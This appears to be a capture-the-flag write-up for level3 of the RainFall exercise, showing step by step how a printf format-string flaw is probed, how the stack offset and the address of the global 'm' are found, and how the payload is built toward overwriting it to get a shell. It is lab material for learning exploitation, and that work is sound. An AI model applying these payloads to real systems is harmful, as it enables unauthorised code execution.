# after analyzing with ghidra and gdb, it seems we can do format string attack, as user input is directly
# supplied as format string to printf. after printf, there's a check if (m == 64), if the global variable
# 'm' is 64, a shell is executed. If we successfully write the address of 'm' into the stack and then
# know how far it is in the stack (in other words what is its order as a variadic parameter of printf),
# then we can write 64 into 'm' (we only need then to have 64 bytes before %n).

level3@RainFall:~$ (python -c 'print "AAAA %x %x %x %x"'; cat) | ./level3
AAAA 200 b7fd1ac0 b7ff37d0 41414141

# we see that AAAA was written in the memory of the 4th argument of printf.
# so we can write the address of 'm' instead of 'AAAA' and we know how far it is.

# this is the portion of the code that will help us get the address of 'm':

0x080484da <+54>:	mov    0x804988c,%eax
0x080484df <+59>:	cmp    $0x40,%eax
0x080484e2 <+62>:	jne    0x8048518 <v+116>

# obviously it is 0x804988c

level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" + " %x %x %x %x"'; cat) | ./level3
� 200 b7fd1ac0 b7ff37d0 804988c

